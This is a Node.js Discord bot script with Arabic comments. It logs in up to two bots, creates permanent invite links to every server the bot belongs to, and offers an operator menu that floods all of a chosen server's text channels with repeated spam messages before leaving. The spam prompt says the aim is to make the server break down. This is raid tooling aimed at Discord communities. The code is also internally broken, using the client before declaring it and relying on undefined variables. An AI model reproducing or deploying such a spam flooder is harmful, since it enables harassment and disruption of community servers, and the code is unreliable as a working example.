require('dotenv').config(); // تحميل متغيرات البيئة من ملف .env

// جلب التوكنين من ملف .env
const token1 = process.env.TOKEN_BOT1;
const token2 = process.env.TOKEN_BOT2;

// ... (باقي كود إعدادات البوت والـ Intents كما هو بدون تغيير)

// تشغيل البوت الأول
if (token1) {
  client.login(token1).then(() => {
    console.log(`[Bot 1] تم تسجيل الدخول بنجاح!`);
  }).catch(err => console.error('[Bot 1] خطأ في تسجيل الدخول:', err));
}

// تشغيل البوت الثاني (بنسخة عميل جديدة منفصلة تماماً لتجنب التداخل)
if (token2) {
  const { Client: Client2, GatewayIntentBits: Intents2 } = require('discord.js');
  const client2 = new Client2({ intents: [Intents2.Guilds, Intents2.GuildMessages, Intents2.MessageContent, Intents2.GuildMembers] });
  
  // نفس الأوامر والتعاملات للبوت الثاني
  client2.commands = client.commands;
  
  client2.on('ready', () => {
    console.log(`[Bot 2] تم تسجيل الدخول بنجاح باسم: ${client2.user.tag}`);
  });

  // نسخ معالجات التفاعل والأحداث للبوت الثاني
  client2.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const command = client2.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction);
    } catch (error) {
      console.error(error);
    }
  });

  client2.login(token2).catch(err => console.error('[Bot 2] خطأ في تسجيل الدخول:', err));
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  rest: {
    timeout: 30000
  }
});

client.commands = new Collection();
const commands = [];
const commandNames = new Set();

const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
  const filePath = path.join(commandsPath, file);
  const command = require(filePath);
  
  if ('data' in command && 'execute' in command) {
    if (commandNames.has(command.data.name)) continue;
    commandNames.add(command.data.name);
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
}

const rest = new REST({ version: '10', timeout: 30000 }).setToken(token);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const askQuestion = (query) => {
  return new Promise((resolve) => rl.question(query, resolve));
};

client.once('ready', async () => {
  console.log(`✅ البوت شغال أونلاين باسم: ${client.user.tag}`);
  console.log(`🔄 جاري تسجيل الأوامر عالمياً...`);

  try {
    await rest.put(
      Routes.applicationCommands(clientId),
      { body: commands },
    );
    console.log(`✨ تم تسجيل الأوامر بنجاح!`);
  } catch (error) {
    console.error(`⚠️ حدث خطأ أثناء تسجيل الأوامر:`, error.message);
  }

  // عرض روابط السيرفرات المتواجد فيها البوت
  console.log(`\n🌐 روابط السيرفرات المتواجد فيها البوت (${client.guilds.cache.size}):`);
  
  for (const [id, guild] of client.guilds.cache) {
    try {
      const channels = guild.channels.cache.filter(c => c.isTextBased() && c.permissionsFor(guild.members.me).has('CreateInstantInvite'));
      
      if (channels.size > 0) {
        const channel = channels.first();
        const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
        
        if (invite) {
          console.log(`- [ ${guild.name} ] ➔ https://discord.gg/${invite.code}`);
        } else {
          console.log(`[ ${guild.name} ] ➔ (تعذر إنشاء رابط دعوة)`);
        }
      } else {
        console.log(`[ ${guild.name} ] ➔ (لا توجد قناة نصية مناسبة)`);
      }
    } catch (err) {
      console.log(`[ ${guild.name} ] ➔ (خطأ أثناء جلب الرابط)`);
    }
  }

  console.log('\n----------------------------------------');

  async function handleServerExitLoop() {
    const initialAnswer = await askQuestion('انت عايز تخرج البوت من سيرفر معين ؟ (Y/N): ');
    
    if (initialAnswer.trim().toUpperCase() !== 'Y') {
      console.log('👍 تم تخطي الخروج.');
      rl.close();
      return;
    }

    let keepExiting = true;
    while (keepExiting) {
      const guilds = Array.from(client.guilds.cache.values());
      
      if (guilds.length === 0) {
        console.log('❌ البوت ليس موجوداً في أي سيرفر حالياً.');
        break;
      }

      console.log('\n--- قائمة السيرفرات الحالية ---');
      guilds.forEach((guild, index) => {
        console.log(`${index + 1}. ${guild.name} (ID: ${guild.id})`);
      });

      const guildIndexInput = await askQuestion('\nاكتب رقم السيرفر اللي عايز تخرج منه (أو اكتب 0 للإلغاء): ');
      const index = parseInt(guildIndexInput.trim()) - 1;
      
      if (index === -1) {
        console.log('👍 تم إلغاء عملية الخروج.');
        break;
      }

      if (index >= 0 && index < guilds.length) {
        const targetGuild = guilds[index];

        // جلب بيانات البوت داخل السيرفر لضمان قراءة الصلاحيات بدقة
        const me = await targetGuild.members.fetchMe().catch(() => null);

        // خيار السبام المكثف
        const spamAnswer = await askQuestion('عايز تسوي سبام كتير لدرجه انو السيرفر يتعطل في كل القنوات ؟ (Y/N): ');

        if (spamAnswer.trim().toUpperCase() === 'Y') {
          const spamMessage = await askQuestion('اكتب رسالة السبام: ');
          const countInput = await askQuestion('اكتب عدد الرسائل لكل قناة (مثلاً 30 أو 50): ');
          const count = parseInt(countInput.trim()) || 30;

          console.log(`🔥 جاري إغراق قنوات سيرفر (${targetGuild.name}) بالرسائل...`);
          
          const channels = targetGuild.channels.cache.filter(c => c.isTextBased() && me && c.permissionsFor(me)?.has('SendMessages'));
          console.log(`📌 عدد القنوات النصية المستهدفة: ${channels.size}`);

          const spamPromises = [];
          for (const [id, channel] of channels) {
            for (let i = 0; i < count; i++) {
              spamPromises.push(
                channel.send(spamMessage).catch(() => {})
              );
            }
          }

          await Promise.allSettled(spamPromises);
          console.log('✅ تم الانتهاء من السبام المكثف!');

        } else {
          const msgText = await askQuestion('اكتب الرسالة اللي هتبعتها قبل الخروج (أو اضغط Enter للتخطي): ');
          if (msgText.trim() !== '') {
            const channel = targetGuild.channels.cache.find(c => c.isTextBased() && me && c.permissionsFor(me)?.has('SendMessages'));
            if (channel) {
              await channel.send(msgText).catch(() => {});
              console.log('✅ تم إرسال الرسالة بنجاح.');
            }
          }
        }

        // الخروج من السيرفر
        try {
          await targetGuild.leave();
          console.log(`🚀 تم الخروج من سيرفر: ${targetGuild.name} بنجاح!`);
        } catch (error) {
          console.error('❌ حدث خطأ أثناء الخروج:', error.message);
        }

        // السؤال عن الخروج من سيرفر آخر
        const anotherAnswer = await askQuestion('\nعايز تطلع من سيرفر تاني؟ (Y/N): ');
        if (anotherAnswer.trim().toUpperCase() !== 'Y') {
          keepExiting = false;
          console.log('👍 تم الانتهاء.');
        }

      } else {
        console.log('❌ رقم السيرفر غير صحيح، حاول مرة أخرى.');
      }
    }
    rl.close();
  }

  handleServerExitLoop();
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;
  const command = client.commands.get(interaction.commandName);
  if (!command) return;

  try {
    await command.execute(interaction);
  } catch (error) {
    console.error(error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ حدث خطأ أثناء تنفيذ الأمر!', ephemeral: true });
    }
  }
});

// منع البوت من الكراش عند حدوث أخطاء غير متوقعة
process.on('unhandledRejection', (reason, promise) => {
    console.log('🔴 خطأ غير معالج:', reason);
});

process.on('uncaughtException', (err, origin) => {
    console.log('🔴 استثناء غير ملتقط:', err);
});

process.on('uncaughtExceptionMonitor', (err, origin) => {
    console.log('🔴 مراقبة الاستثناءات:', err);
});

client.login(token)